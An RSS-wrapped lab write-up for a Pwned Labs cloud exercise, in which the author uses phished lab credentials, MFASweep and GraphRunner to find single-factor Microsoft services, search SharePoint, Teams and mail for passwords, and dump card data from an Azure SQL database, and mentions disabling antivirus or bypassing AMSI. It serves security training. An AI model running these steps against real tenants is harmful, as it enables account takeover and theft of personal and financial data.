<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Pwned Labs - Writeups on Trusted Cybersecurity</title>
		<link>https://belino.com/en/posts/pwnedlabs/</link>
		<description>Recent content in Pwned Labs - Writeups on Trusted Cybersecurity</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en</language>
		<copyright>Maximiliano Belino</copyright>
		<lastBuildDate>Wed, 01 Jan 2025 00:00:00 +0000</lastBuildDate>
		<atom:link href="https://belino.com/en/posts/pwnedlabs/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>Loot Exchange, Teams and SharePoint with GraphRunner</title>
			<link>https://belino.com/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/</link>
			<pubDate>Sat, 02 Nov 2024 15:23:13 -0300</pubDate>
			
			<guid>https://belino.com/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/</guid>
			<description><![CDATA[Pwned Labs - Lab Report]]></description>
			<content type="html"><![CDATA[<ul>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#1-pwned-labs---lab-report">1. Pwned Labs - Lab Report</a>
<ul>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#11-introduction">1.1. Introduction</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#12-objective">1.2. Objective</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#13-scenario">1.3. Scenario</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#14-learning-outcomes">1.4. Learning outcomes</a></li>
</ul>
</li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#2-high-level-summary">2. High-Level Summary</a>
<ul>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#21-recommendations">2.1. Recommendations</a></li>
</ul>
</li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#3-methodologies">3. Methodologies</a>
<ul>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#31-scanning-for-services-without-mfa">3.1. Scanning for services without MFA</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#32-verifying-user-access-to-productivity-tools">3.2. Verifying user access to productivity tools</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#33-searching-for-sensitive-data">3.3. Searching for sensitive data</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#34-database-exfiltration">3.4. Database exfiltration</a></li>
</ul>
</li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#4-detailed-resolution">4. Detailed resolution</a>
<ul>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#41-services-without-mfa">4.1. Services without MFA</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#42-checking-access-to-other-productivity-tools">4.2. Checking access to other productivity tools</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#43-searching-for-sensitive-data">4.3. Searching for sensitive data</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#44-exfiltrating-data-from-azure-sql-database">4.4. Exfiltrating data from Azure SQL database</a></li>
</ul>
</li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#5-conclusions">5. Conclusions</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#6-annex">6. Annex</a>
<ul>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#61-attacker-virtual-machine">6.1. Attacker virtual machine</a></li>
<li><a href="/en/posts/pwnedlabs/loot-exchange-teams-and-sharepoint-with-graphrunner/#62-references">6.2. References</a></li>
</ul>
</li>
</ul>
<h1 id="1-pwned-labs---lab-report">1. Pwned Labs - Lab Report</h1>
<h2 id="11-introduction">1.1. Introduction</h2>
<p>The PWNED LABS Lab Report contains all steps that were conducted in order to go through the Lab named “Loot Exchange, Teams and SharePoint with GraphRunner“. This report should contain all items that were used to achieve the Lab. The purpose of this report is to ensure that Maximiliano has a full understanding of cloud testing methodologies as well as the technical knowledge.</p>
<h2 id="12-objective">1.2. Objective</h2>
<p>The objective of this assessment is to perform a cloud collection of data against the PWNED LABS Lab. The Lab shows the importance to use MFA<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, to protect sensitive data  as passwords and demonstrate how harmful it can be to have a security breach. This Lab should simulate a real cloud assessment.</p>
<h2 id="13-scenario">1.3. Scenario</h2>
<p>The Lab depicts an scenario that tells how we obtained valid credentials and set the working context:</p>
<blockquote>
<p>“Your red team is on an engagement and has successfully phished a Mega Big Tech employee to gain their credentials. So far increasing access within Azure has reached a dead end, and you have been tasked with unlocking further access. In scope is the entire on-premises and cloud infrastructure. Your goal is to gain access to customer records and demonstrate impact.”</p>
</blockquote>
<h2 id="14-learning-outcomes">1.4. Learning outcomes</h2>
<ul>
<li>
<p>Use MFASweep to identify Microsoft services where MFA has not been enabled</p>
</li>
<li>
<p>Use GraphRunner to exfiltrate data from SharePoint, Teams and Exchange Online</p>
</li>
<li>
<p>Move laterally and pillage data from Azure SQL database</p>
</li>
</ul>
<h1 id="2-high-level-summary">2. High-Level Summary</h1>
<p>Maximiliano was tasked with performing a cloud assessment towards PWNED LABS Lab. A cloud assessment is a dedicated attack against cloud services. Maximiliano’s overall objective was to collect data, identify which services have MFA enabled, and which online services a user has access to.</p>
<p>During the testing, Maximiliano had access to sensitive data and information gathering was successfully done.</p>
<h2 id="21-recommendations">2.1. Recommendations</h2>
<p>Maximiliano recommends protecting sensitive data, enabling MFA where possible, and implementing company security policy training.</p>
<h1 id="3-methodologies">3. Methodologies</h1>
<p>Below is a breakout of how Maximiliano was able to collect data of the breached company.</p>
<h2 id="31-scanning-for-services-without-mfa">3.1. Scanning for services without MFA</h2>
<p>During this cloud assessment, Maximiliano was tasked with collecting company loot, exfiltrating data and finding the required flag. The first step is to identify Microsoft services where MFA has not been enabled.</p>
<p>Company: Mega Big Tech</p>
<p>User phished: Clara Miller</p>
<h2 id="32-verifying-user-access-to-productivity-tools">3.2. Verifying user access to productivity tools</h2>
<p>After verifying the single password services we can enumerate, we will check if we have additional access to user generated data. We will log in to Azure as the user Clara Miller and try to find useful data to extract, which could help us access other services.</p>
<h2 id="33-searching-for-sensitive-data">3.3. Searching for sensitive data</h2>
<p>There are some Microsoft applications where we can find valuable information that an attacker could leverage. We will use a post-compromise tool to search for sensitive data.</p>
<p>Searching for keywords like ‘password’ in emails, shared files, or messages could provide us with login credentials to other services.</p>
<h2 id="34-database-exfiltration">3.4. Database exfiltration</h2>
<p>A database is always a valuable asset. If we can obtain credentials to access remotely, we could obtain sensitive client data.</p>
<h1 id="4-detailed-resolution">4. Detailed resolution</h1>
<h2 id="41-services-without-mfa">4.1. Services without MFA</h2>
<p>Initial Azure credentials were provided.</p>
<table>
<thead>
<tr>
<th>Credentials</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>IAM User</td>
<td><a href="mailto:Clara.Miller@megabigtech.com">Clara.Miller@megabigtech.com</a></td>
</tr>
<tr>
<td>Password</td>
<td>MegaBigTech99</td>
</tr>
</tbody>
</table>
<p><strong>MFASweep.ps1</strong></p>
<p>The file <a href="https://github.com/dafthack/MFASweep?tab=readme-ov-file">MFASweep.ps1</a> is a PowerShell script that attempts to log in to different Microsoft services using a provided set of credentials. It will try to identify if MFA is enabled or not.</p>
<p>In order to save this script in our attacking machine we can execute:</p>
<p><code>iwr 'https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1' -UseBasicParsing -OutFile MFASweep.ps1</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner.png"></p>
<p>Afterwards, we can import the module into PowerShell and check the new functions we can invoke:</p>
<p><code>. .\MFASweep.ps1</code></p>
<p><code>ls function:</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-1.png"></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-2.png"></p>
<p>The function Invoke-MFASweep is going to check for MFA presence on various online Microsoft services, and we add an additional check for <em>Active Directory Federated Services</em> (ADFS) in case it is available.</p>
<p>The command to run is:</p>
<p><code>Invoke-MFASweep -Username Clara.Miller@megabigtech.com -Password MegaBigTech99 -Recon -IncludeADFS</code></p>
<p>And the result is:</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-3.png"></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-4.png"></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-5.png"></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-6.png"></p>
<p>The script shows <strong>SINGLE FACTOR ACCESS RESULTS</strong>, these are <strong>only password enabled</strong> services:</p>
<ul>
<li>
<p>Microsoft Graph API</p>
</li>
<li>
<p>Microsoft Service Management API</p>
</li>
</ul>
<p>There are some <strong>Microsoft 365 applications that rely on Microsoft Graph</strong>; for example:</p>
<ul>
<li>
<p>Outlook</p>
</li>
<li>
<p>Teams</p>
</li>
<li>
<p>SharePoint</p>
</li>
</ul>
<p>Maybe we can make use of this in order to enumerate and exfiltrate user generated content.</p>
<h2 id="42-checking-access-to-other-productivity-tools">4.2. Checking access to other productivity tools</h2>
<h3 id="421-login-to-azure">4.2.1. Login to Azure</h3>
<p>In order to login to Azure we will use a module named: <strong>Connect-MgGraph</strong></p>
<p>As this is a fresh Windows VM, first we need to install the module. We need to use this command:</p>
<p><code>Install-Module Microsoft.Graph</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-7.png"></p>
<p>We can check the correct installation using this other command:</p>
<p><code>Get-InstalledModule | Where-Object {$_.Name -match &quot;Microsoft.Graph&quot;}</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-8.png"></p>
<p>Now we can login using this command:</p>
<p><code>Connect-MGGraph</code></p>
<p>A window will pop up where we can insert the password:</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-9.png"></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-10.png"></p>
<h3 id="422-checking-for-microsoft-365-licenses">4.2.2. Checking for Microsoft 365 licenses</h3>
<p>Now we can verify if the user Clara has been assigned a Microsoft 365 license. The PowerShell command to run is:</p>
<p><code>Get-MgUserLicenseDetail -UserId &quot;Clara.Miller@megabigtech.com&quot;</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-11.png"></p>
<p>The command result shows two items, the second one <strong>O365_BUSINESS_ESSENTIALS</strong> means that the user has access to Outlook, Teams, SharePoint and other productivity tools.</p>
<h2 id="43-searching-for-sensitive-data">4.3. Searching for sensitive data</h2>
<h3 id="431-toolset-graph-runner">4.3.1. Toolset: Graph Runner</h3>
<p>At this point we can use the post-compromise tool named <strong>Graph-Runner</strong>.</p>
<p><strong>This tool interacts with the Microsoft Graph API</strong>. In fact, it provides various tools for performing reconnaissance, persistence and pillaging of data from a Microsoft Entra ID (Azure AD) account.</p>
<p>We can download this PowerShell script executing:</p>
<p><code>iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1' -o GraphRUnner.ps1</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-12.png"></p>
<p>Then, we just import the module:</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-13.png"></p>
<p>We can list the “GraphRunner modules” the tool includes:</p>
<p><code>List-GraphRunnerModules</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-14.png"></p>
<p>The <em>Pillage modules</em> looks very interesting:</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-15.png"></p>
<p>We will be using this modules:</p>
<ul>
<li>
<p>Invoke-Search<strong>SharePointAndOneDrive</strong></p>
</li>
<li>
<p>Invoke-Search<strong>Teams</strong></p>
</li>
<li>
<p>Invoke-Search<strong>Mailbox</strong></p>
</li>
</ul>
<h3 id="432-session">4.3.2. Session</h3>
<p>First, we get a session with the Graph API.</p>
<p><code>Get-GraphTokens -UserPasswordAuth</code></p>
<p>(we enter Clara&rsquo;s username and password)</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-16.png"></p>
<p>As expected, authentication is successful and we have the variable <em>$tokens</em> populated:</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-17.png"></p>
<p>We will use this variable <em>$tokens</em> with other commands.</p>
<h3 id="433-searching-for-data">4.3.3. Searching for data</h3>
<p>With the GraphRunner module named <strong>Invoke-SearchSharePointAndOneDrive</strong> we can start searching for user data.</p>
<p>Let’s see an example on how to use the module:</p>
<p><code>Get-Help Invoke-SearchSharePointAndOneDrive -examples</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-18.png"></p>
<h4 id="4331-search-for-files-containing-the-string-password">4.3.3.1. Search for files containing the string ‘password’</h4>
<p>Based on the module help, we can run the command:</p>
<p><code>Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password'</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-19.png"></p>
<p>The module found 2 files that we can download:</p>
<ul>
<li>
<p>File Name: Finance Logins.docx</p>
<ul>
<li>Location:     SharePoint - Shared documents, Finance Team</li>
</ul>
</li>
<li>
<p>File Name: passwords.xlsx</p>
<ul>
<li>Location:     SharePoint - Shared documents</li>
</ul>
</li>
</ul>
<p>We can download both files to see their contents:</p>
<ol>
<li><strong>File: Finance Logins.docx</strong></li>
</ol>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-20.png"></p>
<blockquote>
<p><strong>Finance Team logins</strong></p>
<p>(DO NOT CHANGE PASSWORDS)</p>
<p><strong>Service/Account: Finance Database</strong></p>
<p>URL: https://10.10.11.15/login</p>
<p>Username: finadmin</p>
<p>Password: F1n@nc3Db2023!</p>
<p><strong>Service/Account: Accounting Software</strong></p>
<p>URL: <a href="https://accounting.megabigtech.local">https://accounting.megabigtech.local</a></p>
<p>Username: accounting_user</p>
<p>Password: Acc0unT123!</p>
<p><strong>Service/Account: Payroll System</strong></p>
<p>URL: <a href="https://payrollonlinembt.corp.net">https://payrollonlinembt.corp.net</a></p>
<p>Username: payrollmanager</p>
<p>Password: Payr0llSecure#321</p>
<p><strong>Service/Account: Bank Portal</strong></p>
<p>URL: <a href="https://onlinebanking.megabank.com">https://onlinebanking.megabank.com</a></p>
<p>Username: finusermbt</p>
<p>Password: SecureBankLogin!123</p>
<p><strong>Service/Account: Expense Reporting</strong></p>
<p>URL: <a href="https://expenses.megabigtech.local">https://expenses.megabigtech.local</a></p>
<p>Username: expensereport_user</p>
<p>Password: Exp3n$eTr@cker!</p>
</blockquote>
<ol start="2">
<li><strong>File: passwords.xlsx</strong></li>
</ol>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-21.png"></p>
<blockquote>
<p><strong>Site       Username                     Password</strong></p>
<p>Azure         lindsey_adm              $R4ncher2043</p>
<p>Dev Env     r&amp;d                           MEGAPRODUCTS-777</p>
<p>1Password <a href="mailto:Lindsey.Miller@megabigtech.com">Lindsey.Miller@megabigtech.com</a>     gvh65Jkvkk46vk$!</p>
<p>HR login    lmiller                     Password123</p>
</blockquote>
<p>Now we have gathered new login information. These may help us attack, obtain additional data or even gain access to the servers if we can leverage application vulnerabilities or misconfigurations.</p>
<h4 id="4332-search-for-files-containing-the-string-bonus">4.3.3.2. Search for files containing the string ‘bonus’</h4>
<p>As we did before, searching for the string ‘password’, now we can search for the files containing the word ‘bonus’:</p>
<p><code>Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'bonus'</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-22.png"></p>
<p>The module found one file, named: <em>“Bonuses - Confidential.xlsx”</em></p>
<p>This appears to be another interesting and sensitive file.</p>
<p>Trying to open the file we see that it’s password protected:</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-23.png"></p>
<h4 id="4333-search-inside-team-messages">4.3.3.3. Search inside Team messages</h4>
<p>The Microsoft application Teams is commonly used by organizations. It’s not a good security practice to share sensitive data through messages, but many people do it.</p>
<p>Let’s invoke the module in charge of this task Invoke-SearchTeams and search for the string ‘password’.</p>
<p>The command to run is:</p>
<p><code>Invoke-SearchTeams -Tokens $tokens -SearchTerm password</code></p>
<p><img alt="|700" src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-24.png"></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-25.png"></p>
<p>From the output we see a new password: <em>openme123!</em></p>
<p>Would this password work with our recently found spreadsheet file?</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-26.png"></p>
<p>Yes! It worked.</p>
<h4 id="4334-search-in-users-mailbox">4.3.3.4. Search in user’s mailbox</h4>
<p>Another source of information could be emails. This time, we will use the module Invoke-SearchMailbox.</p>
<p><code>Invoke-SearchMailbox -Tokens $tokens -SearchTerm &quot;password&quot; -MessageCount 40</code></p>
<p>We can see some interesting data inside the results:</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-27.png"></p>
<p>The email found reveals credentials to access a database server:</p>
<ul>
<li>
<p><code>Server name: mbt-finance.database.windows.net</code></p>
</li>
<li>
<p><code>Database: Finance</code></p>
</li>
<li>
<p><code>Username: financereports</code></p>
</li>
<li>
<p><code>Password: $reporting$123</code></p>
</li>
</ul>
<p>The subdomain (<code>database.windows.net</code>) within the “<em>Server name</em>” reveals this is an Azure SQL database.</p>
<p>We can try to connect to this Azure database and interact using PowerShell or another tool like Visual Studio Code.</p>
<h2 id="44-exfiltrating-data-from-azure-sql-database">4.4. Exfiltrating data from Azure SQL database</h2>
<p>We are going to use <strong>PowerShell as our database client</strong>.</p>
<p>To make queries to the Azure database, we first need to make a connection.</p>
<p><strong>1. Connection</strong></p>
<p>From PowerShell we can set the connection as follows:</p>
<p><code>$conn = New-Object System.Data.SqlClient.SqlConnection</code>
<code>$password='reporting$123'</code>
<code>$conn.ConnectionString = &quot;Server=mbt-finance.database.windows.net;Database=Finance;User ID=financereports;Password=password;&quot;</code>
<code>$conn.Open()</code></p>
<p><strong>2. Query</strong></p>
<p>Then, we can query the database “Finance” for it’s Tables:</p>
<p><code>$sqlcmd = $conn.CreateCommand()</code><br>
<code>$sqlcmd.Connection = $conn</code><br>
<strong><code>$query = &quot;SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';&quot;</code></strong><br>
<code>$sqlcmd.CommandText = $query</code><br>
<code>$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd</code><br>
<code>$data = New-Object System.Data.DataSet</code><br>
<code>adp.Fill(data) | Out-Null</code><br>
<code>$data.Tables</code></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-28.png"></p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-29.png"></p>
<p>There is a table named “<em>Subscribers</em>”, let’s query the information contained inside the table.</p>
<p><strong>3. Query data from table: Subscribers</strong></p>
<p><code>$sqlcmd = $conn.CreateCommand()</code>
<code>$sqlcmd.Connection = $conn</code>
<strong><code>$query = &quot;SELECT * FROM Subscribers;&quot;</code></strong>
<code>$sqlcmd.CommandText = $query</code>
<code>$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd</code>
<code>$data = New-Object System.Data.DataSet</code>
<code>adp.Fill(data) | Out-Null</code>
<code>$data.Tables | ft</code></p>
<p>Result:</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-30.png"></p>
<p>The results show the Personally Identifiable Information (PII) of all the company subscribers with no encryption at all: Card Number, CVV, Expiry Date, Full Name and Birthdate. In conclusion, this is a huge security issue.</p>
<p>The last row shows the Flag we need to end the Lab.</p>
<p><img src="../../../../images/Loot%20Exchange,%20Teams%20and%20SharePoint%20with%20GraphRunner-31.png"></p>
<p>To close the connection just execute:</p>
<p><code>$conn.Close()</code></p>
<h1 id="5-conclusions">5. Conclusions</h1>
<p>It’s important to conclude with all the “mistakes” we encountered in this cloud environment.</p>
<p>The Pwned Labs Walkthrough enumerates them excellently, so I will just copy them here for completeness:</p>
<ol>
<li>
<p>Lack of MFA on logging on to Microsoft 365 and Azure.</p>
</li>
<li>
<p>This allowed us to enumerate the license details and access various services, including Teams, Email (Exchange) SharePoint and OneDrive.</p>
</li>
<li>
<p>Even worse, there were credentials, passwords and sensitive details in the email, documents, and chat. This is a very common bad practice.</p>
</li>
<li>
<p>This unlocked access to several critical financial systems, including an Azure SQL database that contained customer subscription details, including financial data.</p>
</li>
<li>
<p>Another issue with the database is that it&rsquo;s currently accessible to the entire internet. This increases the risk of someone successfully brute forcing the database login details, or gaining credentials and being able to access it. It would be safer to restrict network access to only the IP addresses or ranges that require it.</p>
</li>
</ol>
<h1 id="6-annex">6. Annex</h1>
<h2 id="61-attacker-virtual-machine">6.1. Attacker virtual machine</h2>
<p>In order to go through the Lab, Maximiliano made use of a Windows Virtual Machine (VM). This is ideal for this task as we will be using mostly PowerShell.</p>
<p><strong>Operating System</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">Version</th>
<th style="text-align:left">Windows 10</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Release</td>
<td style="text-align:left">22H2 v1 (Build 19045.2965 - 2023.05)</td>
</tr>
<tr>
<td style="text-align:left">Edition</td>
<td style="text-align:left">Windows 10 Pro</td>
</tr>
<tr>
<td style="text-align:left">Language</td>
<td style="text-align:left">English International</td>
</tr>
</tbody>
</table>
<p><strong>VM</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">Memory</th>
<th style="text-align:left">2.5 GB</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Processors</td>
<td style="text-align:left">2</td>
</tr>
<tr>
<td style="text-align:left">Disk</td>
<td style="text-align:left">40 GB</td>
</tr>
</tbody>
</table>
<p>As the antivirus detects abnormal activity when we load PowerShell scripts, first we need to turn it off or make an AMSI bypass.</p>
<h2 id="62-references">6.2. References</h2>
<p>Here are some of the links to webpages, scripts and tools consulted.</p>
<h3 id="621-mfasweep">6.2.1. MFASweep</h3>
<p><a href="https://github.com/dafthack/MFASweep?tab=readme-ov-file">https://github.com/dafthack/MFASweep?tab=readme-ov-file</a></p>
<h3 id="622-microsoft-mggraph">6.2.2. Microsoft MGGraph</h3>
<p><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.authentication/connect-mggraph?view=graph-powershell-1.0">https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.authentication/connect-mggraph?view=graph-powershell-1.0</a></p>
<p><a href="https://www.sharepointdiary.com/2023/04/how-to-connect-to-microsoft-graph-api-from-powershell.html#h-installing-the-microsoft-graph-powershell-module">https://www.sharepointdiary.com/2023/04/how-to-connect-to-microsoft-graph-api-from-powershell.html#h-installing-the-microsoft-graph-powershell-module</a></p>
<h3 id="623-graphrunner">6.2.3. GraphRunner</h3>
<p><a href="https://github.com/dafthack/GraphRunner">https://github.com/dafthack/GraphRunner</a></p>
<p><a href="https://www.blackhillsinfosec.com/introducing-graphrunner/">https://www.blackhillsinfosec.com/introducing-graphrunner/</a></p>
<hr>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>MFA stands for &ldquo;Multi-Factor Authentication.&rdquo; It&rsquo;s a security measure that requires users to provide two or more verification factors to gain access to a system or account.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content>
		</item>
		
	</channel>
</rss>
